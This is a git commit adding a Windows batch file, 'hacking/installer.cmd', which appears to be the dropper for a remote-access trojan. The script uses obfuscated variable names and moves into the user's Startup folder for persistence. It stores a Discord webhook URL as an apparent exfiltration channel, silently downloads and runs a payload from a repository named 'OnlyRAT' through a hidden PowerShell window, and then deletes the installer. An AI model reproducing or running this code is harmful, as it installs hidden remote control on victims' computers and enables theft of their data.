2b165f8753b89066c7ba584b9d1e937ff8ffb261
Matxin Jimenez <53516864+Matx1n3@users.noreply.github.com>
2024-02-06 17:46:07 +0100

    Add files via upload

---
+++ hacking/installer.cmd
@@ -0,0 +1,9 @@
+@echo off
+set "XNjFYKECht=%cd%"
+set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+cd %YKHfpmMRoQ%
+echo https://discord.com/api/webhooks/1204463402416611348/QM1ovRVHLXEc9BzyeVXmbIgjPKhbz9K-QoI-6LoxgDcwZ9GERwX0YmrNm0DgvJWf0ZdG > lawFvVTikZ.txt
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/payloads/g1.cmd -o wEaoFkNduy.cmd"
+powershell ./wEaoFkNduy.cmd
+cd "%XNjFYKECht%"
+del from-github.cmd
